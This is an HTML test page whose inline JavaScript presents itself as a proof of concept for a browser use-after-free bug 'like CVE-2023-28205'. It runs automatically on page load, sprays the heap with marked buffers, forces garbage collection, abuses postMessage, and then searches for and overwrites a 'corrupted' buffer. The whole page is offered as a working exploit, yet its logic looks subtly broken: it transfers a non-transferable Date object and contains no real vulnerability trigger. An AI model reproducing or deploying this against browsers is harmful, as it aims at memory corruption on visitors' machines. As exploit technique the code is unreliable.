<!DOCTYPE html>
<html>
<head>
    <title>Test</title>
</head>
<body>
    <h1>Loading...</h1>

    <script>
        // exploit.js - CVE-2023-28205-like UAF PoC
        let sprayBuffers = [];
        let retained = { ref: null };

        function triggerGC() {
            try {
                const tmp = [];
                for (let i = 0; i < 100000; i++) {
                    tmp.push(new Uint8Array(0x1000));
                }
            } catch(e) { alert("GC Error: " + e); }
        }

        function setupPrimitive() {
            const arr = [];
            for (let i = 0; i < 100; i++) {
                arr.push({ a: 0x1337, b: new Date(0xdeadbeef) });
            }
            return arr;
        }

        function heapSpray() {
            const marker = 0x41414141;
            const bufferSize = 0x1000;

            for (let i = 0; i < 0x500; i++) {
                const buf = new ArrayBuffer(bufferSize);
                const view = new Uint32Array(buf);
                view[0] = marker;
                sprayBuffers.push(buf);
            }
            retained.ref = sprayBuffers;
            alert("Heap spraying completato!");
        }

        function findOverwrittenBuffer() {
            for (let i = 0; i < sprayBuffers.length; i++) {
                const view = new Uint32Array(sprayBuffers[i]);
                if (view[0] !== 0x41414141) {
                    alert("Buffer corrotto trovato alla posizione: " + i);
                    return sprayBuffers[i];
                }
            }
            return null;
        }

        async function main() {
            try {
                alert("Avvio exploit...");
                const vulnerable = setupPrimitive();
                heapSpray();

                const prom = new Promise(resolve => {
                    addEventListener('message', e => {
                        setTimeout(() => {
                            triggerGC();
                            const targetBuf = findOverwrittenBuffer();
                            
                            if(targetBuf) {
                                const magic = new Uint32Array(targetBuf);
                                alert("Dati letti: 0x" + magic[0].toString(16));
                                magic[2] = 0x58585858;
                                alert("Scrittura riuscita!");
                            }
                            resolve();
                        }, 500);
                    }, { once: true });
                });

                postMessage(vulnerable, '*', [vulnerable[50].b]);
                await prom;

            } catch(e) {
                alert("Errore critico: " + e);
            }
        }

        // Avvia automaticamente dopo 2 secondi
        setTimeout(() => {
            main().catch(e => alert("Errore: " + e));
        }, 2000);
    </script>
</body>
</html>
